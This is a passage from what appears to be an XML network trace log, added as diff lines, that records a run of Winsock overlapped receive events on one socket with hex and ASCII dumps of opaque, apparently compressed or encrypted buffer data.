+<trimmed_bytes count="13276"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="11416" successful="1">
+<dump_line offset="&#x24;0000" dump="C6 B8 4D 15 EA 03 72 E5 17 DE B9 25 51 44 67 7F " ascii="..M...r....&#x25;QDg&#x7F;"/>
+<dump_line offset="&#x24;0010" dump="05 E5 B9 5B A7 55 00 65 E1 5E 32 62 87 DB 4B F7 " ascii="...[.U.e.&#x5E;2b..K."/>
+<dump_line offset="&#x24;0020" dump="EC C7 D2 29 93 3C E0 C1 70 76 F8 5A E1 65 9B 61 " ascii="...&#x29;.&#x3C;..pv.Z.e.a"/>
+<dump_line offset="&#x24;0030" dump="1E 1D 23 C3 F2 FA 7B 1A DE 76 1A 6E 2B EC 62 FD " ascii="..&#x23;...&#x7B;..v.n&#x2B;.b."/>
+<dump_line offset="&#x24;0040" dump="87 93 04 1D 03 13 E8 E3 A3 71 3B D5 BD 81 65 A3 " ascii=".........q;...e."/>
+<dump_line offset="&#x24;0050" dump="17 04 F4 8C F1 9F 5B 10 5D 19 CB 73 E0 12 78 0B " ascii="......[.]..s..x."/>
+<dump_line offset="&#x24;0060" dump="8B 40 2C 71 34 59 60 8A 4E 55 28 B4 36 B3 70 BC " ascii=".&#x40;,q4Y&#x60;.NU&#x28;.6.p."/>
+<dump_line offset="&#x24;0070" dump="4E 5B 6B FF 51 49 73 48 06 0F BE B8 62 9E EA BA " ascii="N[k.QIsH....b..."/>
+<dump_line offset="&#x24;0080" dump="F8 03 63 40 53 02 DE 95 7A 6D 24 C4 F0 AB 1B 03 " ascii="..c&#x40;S...zm&#x24;....."/>
+<dump_line offset="&#x24;0090" dump="DE 8D 96 B8 D5 15 58 2C 29 5B E2 8B 50 3C C0 15 " ascii="......X,&#x29;[..P&#x3C;.."/>
+<dump_line offset="&#x24;00A0" dump="10 A3 F8 CC 27 21 4D 66 3B B0 8A 7C A9 57 C9 52 " ascii="....&#x27;!Mf;..&#x7C;.W.R"/>
+<dump_line offset="&#x24;00B0" dump="D8 43 0A 07 9C F0 E2 4A 72 9A CA 52 1F A9 EF 9B " ascii=".C.....Jr..R...."/>
+<dump_line offset="&#x24;00C0" dump="2C 19 5B 9F 9A AE B5 F4 1D 05 5C 6E 45 37 A7 BB " ascii=",.[.......\nE7.."/>
+<dump_line offset="&#x24;00D0" dump="53 AE 62 43 A8 C2 C1 9C 0C 53 2A 6C D0 D3 E1 9D " ascii="S.bC.....S&#x2A;l...."/>
+<dump_line offset="&#x24;00E0" dump="DD 1B 28 B7 C4 7A DA 42 C0 F4 DA ED 5B 00 54 62 " ascii="..&#x28;..z.B....[.Tb"/>
+<dump_line offset="&#x24;00F0" dump="FB 3F 28 33 63 8B D1 83 A1 EA 24 3C 96 6F 21 A9 " ascii=".&#x3F;&#x28;3c.....&#x24;&#x3C;.o!."/>
+<trimmed_bytes count="11160"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="972" successful="1">
+<dump_line offset="&#x24;0000" dump="5B AB DF 23 50 7A 8C 28 82 62 D2 A2 F9 37 92 9C " ascii="[..&#x23;Pz.&#x28;.b...7.."/>
+<dump_line offset="&#x24;0010" dump="1C 47 45 7C 42 09 29 61 B2 F8 C7 5D 68 2D 7C 9A " ascii=".GE&#x7C;B.&#x29;a...]h-&#x7C;."/>
+<dump_line offset="&#x24;0020" dump="36 8B 6B D0 23 F5 FE D6 1C EA 69 2B 19 05 D5 67 " ascii="6.k.&#x23;.....i&#x2B;...g"/>
+<dump_line offset="&#x24;0030" dump="8D DB 33 5F 30 34 D1 AA A5 45 F4 9C A7 DE F4 6E " ascii="..3_04...E.....n"/>
+<dump_line offset="&#x24;0040" dump="79 8E C0 0C BE 10 20 33 CC 06 DF 3F EF 36 B4 56 " ascii="y..... 3...&#x3F;.6.V"/>
+<dump_line offset="&#x24;0050" dump="10 C3 64 5F 37 85 9B CB B7 68 FF C0 3E C5 55 4A " ascii="..d_7....h..&#x3E;.UJ"/>
+<dump_line offset="&#x24;0060" dump="0F A3 DC BD 2A BE 67 50 6A 31 38 BD 6D 01 53 EE " ascii="....&#x2A;.gPj18.m.S."/>
+<dump_line offset="&#x24;0070" dump="95 E5 84 66 BD BC F8 CD 33 7F 36 97 60 4A C2 05 " ascii="...f....3&#x7F;6.&#x60;J.."/>
+<dump_line offset="&#x24;0080" dump="56 CF 93 DD 3D AD 21 85 E6 10 1C 9B FE 44 43 25 " ascii="V...=.!......DC&#x25;"/>
+<dump_line offset="&#x24;0090" dump="AE 77 6F 02 C0 13 1A DB 32 57 C4 5F AC 3C CC C9 " ascii=".wo.....2W._.&#x3C;.."/>
+<dump_line offset="&#x24;00A0" dump="47 89 2E 96 4B D8 EE D1 6C B5 C0 C2 A8 A5 8B 26 " ascii="G...K...l......&#x26;"/>
+<dump_line offset="&#x24;00B0" dump="C1 B0 19 11 90 EF 84 52 3D 53 90 9E E9 AE DD A6 " ascii=".......R=S......"/>
+<dump_line offset="&#x24;00C0" dump="01 4E AB 09 AA 92 EC 62 69 F4 F3 22 4E 4A F3 F1 " ascii=".N.....bi..&#x22;NJ.."/>
+<dump_line offset="&#x24;00D0" dump="22 8F 63 31 18 F7 70 4D 9B 70 A7 45 54 15 99 82 " ascii="&#x22;.c1..pM.p.ET..."/>
+<dump_line offset="&#x24;00E0" dump="93 4F 25 26 55 2A D2 D7 E9 A9 A8 C7 DF 87 EA 41 " ascii=".O&#x25;&#x26;U&#x2A;.........A"/>
+<dump_line offset="&#x24;00F0" dump="04 08 CA 1C C9 B7 E8 BD CF 9D BB BA A4 8E 30 B8 " ascii="..............0."/>
+<trimmed_bytes count="716"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="11680" successful="1">
+<dump_line offset="&#x24;0000" dump="0D 0A 33 66 66 38 0D 0A D6 FD EE A0 F0 43 E5 62 " ascii="..3ff8.......C.b"/>
+<dump_line offset="&#x24;0010" dump="72 4E AA 05 44 DB 28 C7 E4 AB 1A 7B C3 2C CE A0 " ascii="rN..D.&#x28;....&#x7B;.,.."/>
+<dump_line offset="&#x24;0020" dump="F1 F2 F1 4B 88 83 FA C2 71 E0 62 F6 38 17 9B 04 " ascii="...K....q.b.8..."/>
+<dump_line offset="&#x24;0030" dump="C0 F7 AD 28 95 08 11 69 22 CF 6E E3 33 8E FA AA " ascii="...&#x28;...i&#x22;.n.3..."/>
+<dump_line offset="&#x24;0040" dump="C2 5F E5 44 6A 50 78 BF F9 31 8B 76 98 47 02 C0 " ascii="._.DjPx..1.v.G.."/>
+<dump_line offset="&#x24;0050" dump="BC 9D 3A 1A DE AB A2 46 3C B0 6D 11 2D 14 2B 92 " ascii="..:....F&#x3C;.m.-.&#x2B;."/>
+<dump_line offset="&#x24;0060" dump="85 34 28 62 E3 AA 0B 2D 99 2D 31 C5 10 93 0D F3 " ascii=".4&#x28;b...-.-1....."/>
+<dump_line offset="&#x24;0070" dump="2F 53 45 75 EE 1F 2D AE 16 76 73 CF DE AC DF F6 " ascii="/SEu..-..vs....."/>
+<dump_line offset="&#x24;0080" dump="11 79 6B 68 5A 03 FD 8E F0 01 90 A0 98 F9 DE 05 " ascii=".ykhZ..........."/>
+<dump_line offset="&#x24;0090" dump="BA BD F8 1D 6F 63 A7 96 BF FF 66 F6 A6 34 89 4D " ascii="....oc....f..4.M"/>
+<dump_line offset="&#x24;00A0" dump="1B 60 C3 B4 B6 03 65 08 C4 43 2A FB B4 BA 19 DF " ascii=".&#x60;....e..C&#x2A;....."/>
+<dump_line offset="&#x24;00B0" dump="A6 CF 92 C8 88 AA 8D C6 40 2D 13 7C CC 62 27 C6 " ascii="........&#x40;-.&#x7C;.b&#x27;."/>
+<dump_line offset="&#x24;00C0" dump="B4 6A E4 06 90 AB 7B 80 D5 EA 47 74 40 20 42 4D " ascii=".j....&#x7B;...Gt&#x40; BM"/>
+<dump_line offset="&#x24;00D0" dump="ED BB 51 D5 3B FA 1A 10 E0 3C A6 0F 20 BE FB 58 " ascii="..Q.;....&#x3C;.. ..X"/>
+<dump_line offset="&#x24;00E0" dump="1D 62 1D 6B 60 0F 36 F7 AB 3A 95 3C 0F 75 B5 7A " ascii=".b.k&#x60;.6..:.&#x3C;.u.z"/>
+<dump_line offset="&#x24;00F0" dump="D2 9C CF 78 14 81 7C 69 FE 7E 84 13 DA D7 99 35 " ascii="...x..&#x7C;i.&#x7E;.....5"/>
+<trimmed_bytes count="11424"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="10612" successful="1">
+<dump_line offset="&#x24;0000" dump="91 83 80 F5 90 D1 81 50 AF CB 01 49 95 4F EB B2 " ascii=".......P...I.O.."/>
+<dump_line offset="&#x24;0010" dump="62 E0 13 93 7A D4 B1 37 B2 88 FA 0A 70 88 4F 50 " ascii="b...z..7....p.OP"/>
+<dump_line offset="&#x24;0020" dump="23 C7 28 C7 C1 EC B8 98 60 36 FC 3C 25 0C DC B4 " ascii="&#x23;.&#x28;.....&#x60;6.&#x3C;&#x25;..."/>
+<dump_line offset="&#x24;0030" dump="F6 08 06 C3 6A E9 E5 78 CA 80 82 7D 58 02 71 D6 " ascii="....j..x...&#x7D;X.q."/>
+<dump_line offset="&#x24;0040" dump="D4 F5 0D 4F 98 A1 55 1E 24 16 A9 9F 77 BA 91 37 " ascii="...O..U.&#x24;...w..7"/>
+<dump_line offset="&#x24;0050" dump="D0 0E F7 1F 55 70 8B B4 CB 33 53 E8 A5 E5 CC A0 " ascii="....Up...3S....."/>
+<dump_line offset="&#x24;0060" dump="48 B2 48 BD FD B1 2F 18 83 31 7C 4F B4 F4 02 ED " ascii="H.H.../..1&#x7C;O...."/>
+<dump_line offset="&#x24;0070" dump="BC 6F B1 13 56 7A FD 93 E1 1D B5 F5 C9 4B CE 19 " ascii=".o..Vz.......K.."/>
+<dump_line offset="&#x24;0080" dump="2A 51 E1 2F CE 8C 37 AE F9 1B 65 5C 75 5B 0A F9 " ascii="&#x2A;Q./..7...e\u[.."/>
+<dump_line offset="&#x24;0090" dump="B5 05 C3 8F 2C 5C 30 9D 18 3A B2 94 8E F7 C7 9E " ascii="....,\0..:......"/>
+<dump_line offset="&#x24;00A0" dump="1B 6D FC 82 2B 18 7C 48 79 7A DC 64 88 4C 18 B4 " ascii=".m..&#x2B;.&#x7C;Hyz.d.L.."/>
+<dump_line offset="&#x24;00B0" dump="7E 43 C1 7E 0B 9D E2 5F 64 13 D8 46 9D 2D 42 F9 " ascii="&#x7E;C.&#x7E;..._d..F.-B."/>
+<dump_line offset="&#x24;00C0" dump="DD 34 F1 D2 92 86 16 27 3D C6 55 6A 26 B0 4A D2 " ascii=".4.....&#x27;=.Uj&#x26;.J."/>
+<dump_line offset="&#x24;00D0" dump="26 E4 91 AF 36 A1 15 FA 2D 78 9D C0 B1 7B 02 E0 " ascii="&#x26;...6...-x...&#x7B;.."/>
+<dump_line offset="&#x24;00E0" dump="CD 86 78 80 D2 65 06 63 6A F7 2F 08 B4 7D 90 F3 " ascii="..x..e.cj./..&#x7D;.."/>
+<dump_line offset="&#x24;00F0" dump="F6 E8 46 AD CF 45 73 64 91 6F 34 70 5D 44 CF 5A " ascii="..F..Esd.o4p]D.Z"/>
+<trimmed_bytes count="10356"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="2920" successful="1">
+<dump_line offset="&#x24;0000" dump="CC A0 9B 7E E5 F5 95 11 66 B3 4B E2 CB 8D F9 5C " ascii="...&#x7E;....f.K....\"/>
+<dump_line offset="&#x24;0010" dump="2D C1 0D 47 75 5B D8 5D 0C 76 06 59 6F 7E E7 B9 " ascii="-..Gu[.].v.Yo&#x7E;.."/>
+<dump_line offset="&#x24;0020" dump="CB 70 60 9C 4D E6 5D 98 E6 1B 04 BA D0 1F D5 B0 " ascii=".p&#x60;.M.]........."/>
+<dump_line offset="&#x24;0030" dump="13 5B EB 9E E6 99 E9 8C 1E 3E D0 49 9A 09 A7 9A " ascii=".[.......&#x3E;.I...."/>
+<dump_line offset="&#x24;0040" dump="AB 9B 8E A8 8A F5 8D B9 A5 D3 36 88 3B 1F 98 90 " ascii="..........6.;..."/>
+<dump_line offset="&#x24;0050" dump="B6 8B 86 8E AB 9F 7D 4C 61 34 EC C2 16 C7 D8 CD " ascii="......&#x7D;La4......"/>
+<dump_line offset="&#x24;0060" dump="09 05 BB E0 10 5C 90 27 89 BD DB 7F 8C D4 68 D5 " ascii=".....\.&#x27;...&#x7F;..h."/>
+<dump_line offset="&#x24;0070" dump="96 33 E7 48 C0 A4 7A F4 8C 25 D4 D1 56 39 EA 7D " ascii=".3.H..z..&#x25;..V9.&#x7D;"/>
+<dump_line offset="&#x24;0080" dump="38 CE 9E 02 2F F1 2E E3 59 B1 B4 30 32 57 C9 75 " ascii="8.../...Y..02W.u"/>
+<dump_line offset="&#x24;0090" dump="BB DF 83 7A E6 7E 04 C0 59 72 90 89 4C A6 89 53 " ascii="...z.&#x7E;..Yr..L..S"/>
+<dump_line offset="&#x24;00A0" dump="6C DD 3F 64 28 53 3F 63 E9 60 29 F5 E6 F2 C2 3C " ascii="l.&#x3F;d&#x28;S&#x3F;c.&#x60;&#x29;....&#x3C;"/>
+<dump_line offset="&#x24;00B0" dump="D9 52 D4 2F 7A DE 9C C7 72 3B DB 12 81 B4 0E B5 " ascii=".R./z...r;......"/>
+<dump_line offset="&#x24;00C0" dump="11 A8 1E 12 E1 DE 0C 51 AC 32 C6 CC 1B EA E9 D7 " ascii=".......Q.2......"/>
+<dump_line offset="&#x24;00D0" dump="6E AD 67 E9 A6 C0 67 EF DD DD DF 4C C4 44 35 6A " ascii="n.g...g....L.D5j"/>
+<dump_line offset="&#x24;00E0" dump="E2 0D 49 83 7C FE B2 B4 8B 4C 95 4A C0 29 92 1F " ascii="..I.&#x7C;....L.J.&#x29;.."/>
+<dump_line offset="&#x24;00F0" dump="23 02 CD 44 A7 6E E7 C2 AF 71 A0 C7 63 70 2D BD " ascii="&#x23;..D.n...q..cp-."/>
+<trimmed_bytes count="2664"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="16392" successful="1">
+<dump_line offset="&#x24;0000" dump="BD F3 B1 9B BB BF 12 37 BD EB 47 D2 5C FA 51 1E " ascii=".......7..G.\.Q."/>
+<dump_line offset="&#x24;0010" dump="8A DC 1F 8A D5 81 72 9B 79 08 F1 2B F7 BD 0A EC " ascii="......r.y..&#x2B;...."/>
+<dump_line offset="&#x24;0020" dump="83 06 B8 FE 16 59 4F 19 04 47 90 6B FE EF EB AF " ascii=".....YO..G.k...."/>
+<dump_line offset="&#x24;0030" dump="22 20 2B FA 3F 4E CC 21 C8 2E C7 61 A5 40 06 A0 " ascii="&#x22; &#x2B;.&#x3F;N.!...a.&#x40;.."/>
+<dump_line offset="&#x24;0040" dump="CE A3 3C 6E 85 0F F9 40 24 CE 7B 29 EF 13 FC 19 " ascii="..&#x3C;n...&#x40;&#x24;.&#x7B;&#x29;...."/>
+<dump_line offset="&#x24;0050" dump="0A E4 BD 6E 40 F2 B0 2F B5 83 92 B8 CC 0C B5 2A " ascii="...n&#x40;../.......&#x2A;"/>
+<dump_line offset="&#x24;0060" dump="F8 94 B5 27 71 AB B6 40 96 33 39 74 F8 97 1A 7C " ascii="...&#x27;q..&#x40;.39t...&#x7C;"/>
+<dump_line offset="&#x24;0070" dump="37 D3 1F C4 53 32 E9 70 3E 5A 03 2E D8 D4 C4 26 " ascii="7...S2.p&#x3E;Z.....&#x26;"/>
+<dump_line offset="&#x24;0080" dump="9D 20 AE 7D 1B B4 52 02 1A 44 94 00 E8 2B 3C 32 " ascii=". .&#x7D;..R..D...&#x2B;&#x3C;2"/>
+<dump_line offset="&#x24;0090" dump="EF A0 40 5E 4F 99 7A B7 83 78 1D A7 90 84 57 51 " ascii="..&#x40;&#x5E;O.z..x....WQ"/>
+<dump_line offset="&#x24;00A0" dump="D0 A0 80 06 F3 3A A7 51 FB 6E 4E 41 35 D6 65 80 " ascii=".....:.Q.nNA5.e."/>
+<dump_line offset="&#x24;00B0" dump="13 4A 4B 05 2E 31 81 9B 3A CD 66 CB 7B CC 36 12 " ascii=".JK..1..:.f.&#x7B;.6."/>
+<dump_line offset="&#x24;00C0" dump="E7 52 44 31 54 0E FF 2D 72 1D EC 42 25 4F 38 1B " ascii=".RD1T..-r..B&#x25;O8."/>
+<dump_line offset="&#x24;00D0" dump="02 C2 A9 E0 F9 C0 60 BE BB A7 7F 76 69 45 95 37 " ascii="......&#x60;...&#x7F;viE.7"/>
+<dump_line offset="&#x24;00E0" dump="73 CF 51 8F 78 28 48 50 79 C8 04 C2 98 42 5D 44 " ascii="s.Q.x&#x28;HPy....B]D"/>
+<dump_line offset="&#x24;00F0" dump="FE 04 7D 62 CA 50 61 26 54 5B 7E 21 2A 41 3F 4A " ascii="..&#x7D;b.Pa&#x26;T[&#x7E;!&#x2A;A&#x3F;J"/>
+<trimmed_bytes count="16136"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="12552" successful="1">
+<dump_line offset="&#x24;0000" dump="8E 7B 10 F4 A4 3D 2C ED 36 AF 54 1C B1 B9 77 C9 " ascii=".&#x7B;...=,.6.T...w."/>
+<dump_line offset="&#x24;0010" dump="BE 51 6E 57 3F 5C 54 5E 9B 0C 02 85 4A 14 67 48 " ascii=".QnW&#x3F;\T&#x5E;....J.gH"/>
+<dump_line offset="&#x24;0020" dump="0B DE 6D 94 EC F2 83 82 33 0F 1F A4 7B B4 B9 5B " ascii="..m.....3...&#x7B;..["/>
+<dump_line offset="&#x24;0030" dump="B9 93 A0 BA 71 14 81 6D 5D F7 BF 31 F0 34 77 FF " ascii="....q..m]..1.4w."/>
+<dump_line offset="&#x24;0040" dump="AA B1 E7 D4 BF F7 D0 76 E6 59 81 5C F8 0B 63 15 " ascii=".......v.Y.\..c."/>
+<dump_line offset="&#x24;0050" dump="E0 3F B8 C7 E4 B5 A3 CA C8 81 D4 C2 70 36 A8 85 " ascii=".&#x3F;..........p6.."/>
+<dump_line offset="&#x24;0060" dump="1E 8C 9F F1 0F 98 0D AF 54 DF 69 05 5A 2A A9 9D " ascii="........T.i.Z&#x2A;.."/>
+<dump_line offset="&#x24;0070" dump="FD 07 C2 FA C3 7F B4 2C 6E 46 F4 8A 1F 80 25 E2 " ascii=".....&#x7F;.,nF....&#x25;."/>
+<dump_line offset="&#x24;0080" dump="3B 57 1C A8 0D 93 E3 33 17 E8 BD 48 F6 D4 B6 EE " ascii=";W.....3...H...."/>
+<dump_line offset="&#x24;0090" dump="F9 0C B1 7B 04 EA 25 E2 CF FB 2B DA 61 DE 39 0B " ascii="...&#x7B;..&#x25;...&#x2B;.a.9."/>
+<dump_line offset="&#x24;00A0" dump="52 C8 2D C1 34 8E C3 71 F6 3B 40 00 A3 CB 28 24 " ascii="R.-.4..q.;&#x40;...&#x28;&#x24;"/>
+<dump_line offset="&#x24;00B0" dump="96 10 EE 43 EA E5 98 26 CA 67 A7 37 04 27 8D EA " ascii="...C...&#x26;.g.7.&#x27;.."/>
+<dump_line offset="&#x24;00C0" dump="41 30 87 24 E3 0F 4F 59 9D 7A 76 3A FA 20 F8 89 " ascii="A0.&#x24;..OY.zv:. .."/>
+<dump_line offset="&#x24;00D0" dump="B9 C8 7D F6 01 72 CE E7 E0 D4 2D 87 08 05 19 6C " ascii="..&#x7D;..r....-....l"/>
+<dump_line offset="&#x24;00E0" dump="7E D6 5E 9E 23 D4 49 F2 39 DC F7 B0 AD 9C 77 61 " ascii="&#x7E;.&#x5E;.&#x23;.I.9.....wa"/>
+<dump_line offset="&#x24;00F0" dump="E1 48 96 10 CD DE 75 CA E7 88 53 13 FF 0F B7 F7 " ascii=".H....u...S....."/>
+<trimmed_bytes count="12296"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="2920" successful="1">
+<dump_line offset="&#x24;0000" dump="EF CD 39 1E E5 88 0E B5 53 B4 6F AC 31 11 55 C3 " ascii="..9.....S.o.1.U."/>
+<dump_line offset="&#x24;0010" dump="E6 9D 86 B7 43 B7 5D FE 7E 45 A5 BF 22 5E 71 DF " ascii="....C.].&#x7E;E..&#x22;&#x5E;q."/>
+<dump_line offset="&#x24;0020" dump="6F 8A FC AA 0D F2 F4 03 98 FA E9 9E B4 35 6E D7 " ascii="o............5n."/>
+<dump_line offset="&#x24;0030" dump="19 04 8D D3 80 E6 C7 44 74 0D 3A F0 B2 34 8F B6 " ascii=".......Dt.:..4.."/>
+<dump_line offset="&#x24;0040" dump="A5 3D 4D 80 41 E6 24 D4 3C AC 4E D8 C4 33 EA 66 " ascii=".=M.A.&#x24;.&#x3C;.N..3.f"/>
+<dump_line offset="&#x24;0050" dump="0F F9 D8 4A 71 89 90 F4 5D 03 26 80 56 8C 99 71 " ascii="...Jq...].&#x26;.V..q"/>
+<dump_line offset="&#x24;0060" dump="F1 6B 7B 2A F3 40 65 26 51 BC 8B 68 E5 5E E7 AB " ascii=".k&#x7B;&#x2A;.&#x40;e&#x26;Q..h.&#x5E;.."/>
+<dump_line offset="&#x24;0070" dump="C7 CF 50 9B 5C 00 60 B0 19 FE C2 13 78 C0 A5 DA " ascii="..P.\.&#x60;.....x..."/>
+<dump_line offset="&#x24;0080" dump="CB 89 CF 19 DF DF 1B F8 C0 A8 83 68 E7 C1 8B 84 " ascii="...........h...."/>
+<dump_line offset="&#x24;0090" dump="B6 33 D2 A4 18 E3 D9 35 00 68 1B 63 0E 7D 30 D3 " ascii=".3.....5.h.c.&#x7D;0."/>
+<dump_line offset="&#x24;00A0" dump="8E A3 B3 BB 06 A3 A7 72 DF 91 BE E6 A5 32 5C 3C " ascii=".......r.....2\&#x3C;"/>
+<dump_line offset="&#x24;00B0" dump="EB 20 7D A0 2C 7A B5 79 C1 B2 DD A1 3C 72 BD 51 " ascii=". &#x7D;.,z.y....&#x3C;r.Q"/>
+<dump_line offset="&#x24;00C0" dump="27 14 55 E1 BF E5 75 65 37 42 A6 AB E0 59 70 EA " ascii="&#x27;.U...ue7B...Yp."/>
+<dump_line offset="&#x24;00D0" dump="8B 29 13 B7 BF 83 64 38 72 04 13 64 4F 15 35 AD " ascii=".&#x29;....d8r..dO.5."/>
+<dump_line offset="&#x24;00E0" dump="28 00 6C 78 8E 27 CD DC 49 E9 93 15 05 61 EA 3D " ascii="&#x28;.lx.&#x27;..I....a.="/>
+<dump_line offset="&#x24;00F0" dump="DE C1 E1 2E C3 7E 5D 54 C2 94 69 30 32 90 42 03 " ascii=".....&#x7E;]T..i02.B."/>
+<trimmed_bytes count="2664"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="392" successful="1">
+<dump_line offset="&#x24;0000" dump="54 A7 1F 7A 5B 16 B0 6E B5 DA 8F C2 3D C2 F0 05 " ascii="T..z[..n....=..."/>
+<dump_line offset="&#x24;0010" dump="80 6A F6 A4 28 1E 05 64 61 8C 9D 06 71 FD 52 8A " ascii=".j..&#x28;..da...q.R."/>
+<dump_line offset="&#x24;0020" dump="F5 EF A9 AB 4F 03 2B 2A 45 E4 8E 4B 9C 3C D6 EA " ascii="....O.&#x2B;&#x2A;E..K.&#x3C;.."/>
+<dump_line offset="&#x24;0030" dump="3C 09 EB 42 3C 86 FD 7C 53 3B 45 59 BB D2 72 12 " ascii="&#x3C;..B&#x3C;..&#x7C;S;EY..r."/>
+<dump_line offset="&#x24;0040" dump="85 6B 03 33 90 0F 03 3E EC FA B8 1A B6 4B DE 94 " ascii=".k.3...&#x3E;.....K.."/>
+<dump_line offset="&#x24;0050" dump="21 F7 57 07 6A 6A 71 D7 E8 DC C1 5C 51 F3 E5 D5 " ascii="!.W.jjq....\Q..."/>
+<dump_line offset="&#x24;0060" dump="5F 26 E5 BA BC EE C0 F2 A0 E6 43 81 76 FC D1 AE " ascii="_&#x26;........C.v..."/>
+<dump_line offset="&#x24;0070" dump="5E D3 94 9E CD 68 14 97 F7 28 64 B0 8F 45 7D 4D " ascii="&#x5E;....h...&#x28;d..E&#x7D;M"/>
+<dump_line offset="&#x24;0080" dump="0E A2 11 6D 9C 96 D0 D0 7A FC F9 54 67 E0 A8 43 " ascii="...m....z..Tg..C"/>
+<dump_line offset="&#x24;0090" dump="11 E1 CA 47 18 DD 3A 98 FF 76 B4 59 C7 05 2B CB " ascii="...G..:..v.Y..&#x2B;."/>
+<dump_line offset="&#x24;00A0" dump="48 3E 22 EF AE E8 8C CB 29 EB CD 7C 20 71 74 AC " ascii="H&#x3E;&#x22;.....&#x29;..&#x7C; qt."/>
+<dump_line offset="&#x24;00B0" dump="28 DC F6 69 C1 3B DD 67 31 24 45 5F C5 62 45 74 " ascii="&#x28;..i.;.g1&#x24;E_.bEt"/>
+<dump_line offset="&#x24;00C0" dump="12 CF 6C F9 B4 20 45 18 B0 C6 05 A7 20 2F BD 0D " ascii="..l.. E..... /.."/>
+<dump_line offset="&#x24;00D0" dump="73 F1 F8 F1 DE 48 6F 74 8E F1 7D 92 12 24 3D B2 " ascii="s....Hot..&#x7D;..&#x24;=."/>
+<dump_line offset="&#x24;00E0" dump="B8 7A D8 98 13 23 60 00 54 0C DC 68 1B DE 6B 09 " ascii=".z...&#x23;&#x60;.T..h..k."/>
+<dump_line offset="&#x24;00F0" dump="78 00 07 F0 DF F5 86 D6 C2 84 71 C1 CD 62 16 CD " ascii="x.........q..b.."/>
+<trimmed_bytes count="136"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="12884" successful="1">
+<dump_line offset="&#x24;0000" dump="FB DC 9D 80 10 60 B8 84 91 EF 1C F1 40 5E 25 20 " ascii=".....&#x60;......&#x40;&#x5E;&#x25; "/>
+<dump_line offset="&#x24;0010" dump="66 C9 4F A6 DB 86 EB E1 C9 B5 30 BF D1 3A 1D 01 " ascii="f.O.......0..:.."/>
+<dump_line offset="&#x24;0020" dump="A0 2D BD 9C C5 06 A0 BC 47 CD 1E 27 14 B2 55 20 " ascii=".-......G..&#x27;..U "/>
+<dump_line offset="&#x24;0030" dump="0B CD 9A 61 37 C9 7D AC A0 27 C4 87 CC B3 0B 5C " ascii="...a7.&#x7D;..&#x27;.....\"/>
+<dump_line offset="&#x24;0040" dump="4C 9A 39 80 09 34 DC 98 11 C5 2F 35 09 48 87 5C " ascii="L.9..4..../5.H.\"/>
+<dump_line offset="&#x24;0050" dump="AE 25 2D 56 E9 27 28 5E 82 BB 7C 0D 07 16 6C C6 " ascii=".&#x25;-V.&#x27;&#x28;&#x5E;..&#x7C;...l."/>
+<dump_line offset="&#x24;0060" dump="63 C2 29 57 8D 28 6C FE C3 8E B4 09 46 D5 CF 58 " ascii="c.&#x29;W.&#x28;l.....F..X"/>
+<dump_line offset="&#x24;0070" dump="50 71 1D 94 95 BC 1A AF 38 73 15 7E 02 97 5E 8C " ascii="Pq......8s.&#x7E;..&#x5E;."/>
+<dump_line offset="&#x24;0080" dump="C4 74 9B 9D FD 3D 50 1F 6A 9B 54 6B 89 6A 97 07 " ascii=".t...=P.j.Tk.j.."/>
+<dump_line offset="&#x24;0090" dump="97 A6 A8 95 93 C3 D2 17 26 F4 FC 27 B5 D1 54 45 " ascii="........&#x26;..&#x27;..TE"/>
+<dump_line offset="&#x24;00A0" dump="DE E8 E8 01 54 84 DC 34 B2 B7 2C A4 40 BF 52 FB " ascii="....T..4..,.&#x40;.R."/>
+<dump_line offset="&#x24;00B0" dump="88 BE 07 F4 E9 C7 4C C9 1C FF E6 A3 2D 04 D7 E7 " ascii="......L.....-..."/>
+<dump_line offset="&#x24;00C0" dump="50 DF 54 E0 89 B9 51 85 2F 47 71 97 AE 59 F6 A1 " ascii="P.T...Q./Gq..Y.."/>
+<dump_line offset="&#x24;00D0" dump="7D 91 16 B6 A0 71 C8 E7 28 BA D2 C6 0A 3B 45 7F " ascii="&#x7D;....q..&#x28;....;E&#x7F;"/>
+<dump_line offset="&#x24;00E0" dump="1B 36 A3 2E A2 DF 47 E6 72 6C F7 4E 4F 99 01 E0 " ascii=".6....G.rl.NO..."/>
+<dump_line offset="&#x24;00F0" dump="B7 09 50 5C AF FB ED 3B 18 DA 43 D3 D6 E9 F1 74 " ascii="..P\...;..C....t"/>
+<trimmed_bytes count="12628"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="13688" successful="1">
+<dump_line offset="&#x24;0000" dump="A4 93 95 EE 86 2C B7 7B EE BD 9D B0 67 F1 F2 62 " ascii=".....,.&#x7B;....g..b"/>
+<dump_line offset="&#x24;0010" dump="74 DE 7E 4C 16 C4 77 77 AE D3 B1 0E F2 DA 55 B8 " ascii="t.&#x7E;L..ww......U."/>
+<dump_line offset="&#x24;0020" dump="B1 74 F4 D0 AA B7 85 21 F2 25 54 FD 75 1B CD 5C " ascii=".t.....!.&#x25;T.u..\"/>
+<dump_line offset="&#x24;0030" dump="64 C9 64 5E 1F 40 ED 3E A8 7F 2D F7 1F C2 17 51 " ascii="d.d&#x5E;.&#x40;.&#x3E;.&#x7F;-....Q"/>
+<dump_line offset="&#x24;0040" dump="2C 69 AE 03 B0 B0 D7 FC 09 A6 6F 47 88 BA 91 73 " ascii=",i........oG...s"/>
+<dump_line offset="&#x24;0050" dump="0D 3A 28 14 5B D6 9B 7C A9 46 2B C8 9E 96 B1 6C " ascii=".:&#x28;.[..&#x7C;.F&#x2B;....l"/>
